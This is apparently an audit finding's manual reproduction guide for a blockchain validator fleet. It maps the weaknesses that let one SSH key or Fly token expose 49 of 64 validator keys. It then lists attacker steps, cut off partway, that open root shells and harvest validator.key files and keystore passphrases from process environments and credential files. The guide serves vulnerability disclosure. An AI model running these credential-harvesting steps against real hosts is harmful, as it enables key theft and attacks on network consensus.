# INF-02 — manual reproduction (operational half)

The consensus half is `repro-INF-02.rs` (copy to
`crates/bloch-pos-committee/tests/repro_inf_02.rs`). This file covers the
part a unit test cannot: that one credential yields ≥49 usable validator keys.

## Facts from the repository (verify each yourself)

1. `python3 verify/decode_manifest.py` against `genesis/mainnet.manifest`:
   64 validators, all `stake_sat = 2_500_000_000_000`, cohort = all 64.
   Any 43 hold ≥ 2/3; 49 hold 76.56 %; 15 hold 23.44 %.
2. `deploy/FLAG-DAY-EPOCH-800.md:60-64,89-92`: 49 of 64 validators are Fly
   machines in ONE app (`bloch-g4`), no public IP; the other 15 are classic
   boxes. `deploy/SSH-ROLE-SEPARATION.md:5-12`: one SSH key + `ubuntu@`
   reaches all 65 hosts, no `from=`/`command=` restriction.
3. `crates/bloch-pos-node/src/keys.rs:230-231,325-337`: the unlock secret is
   read from `BLOCH_KEYSTORE_PASSPHRASE_FILE` / `BLOCH_KEYSTORE_PASSPHRASE`
   or the plaintext opt-in `BLOCH_KEYSTORE_ALLOW_PLAINTEXT=1` — all of which
   live ON THE HOST next to `validator.key`. Sealing (`BPOSKEY2`) therefore
   does not defend against a host-level credential holder.
4. `crates/bloch-pos-node/src/engine.rs:4795-4812`: doppelgänger protection
   is a local boot-time option (`BLOCH_NO_DOPPELGANGER=1`); `slashprot.rs`
   is a local watermark file. Neither runs on the attacker's copy.
5. `crates/bloch-pos-committee/src/params.rs:1425` + `transition.rs:3084-3089`:
   `SLASHING_EVIDENCE_ACTIVATION_EPOCH = u64::MAX`, evidence is refused, so
   equivocation costs the stolen stake nothing.

## Steps (attacker holding the fleet SSH key OR the Fly org/app token)

1. Enumerate hosts: Fly → `fly machines list -a bloch-g4` (49); classic →
   the peer list any validator unit carries (`--peers`, 63 entries).
2. Per Fly machine: `fly ssh console -a bloch-g4 -s` (root shell).
   Per classic host: `ssh -i edgevana_fleet_g4 ubuntu@$HOST`.
3. Collect the key material:
   - `find / -name validator.key` → copy the file (BPOSKEY1: done).
   - If BPOSKEY2: `cat /proc/$(pgrep bloch-pos)/environ | tr '\0' '\n' |
     grep BLOCH_KEYSTORE`, or read `$CREDENTIALS_DIRECTORY/keystore-passphrase`
     / the `LoadCredential=` source path from `systemctl cat`. On Fly the
     passphrase is necessarily a Fly secret → in the machine's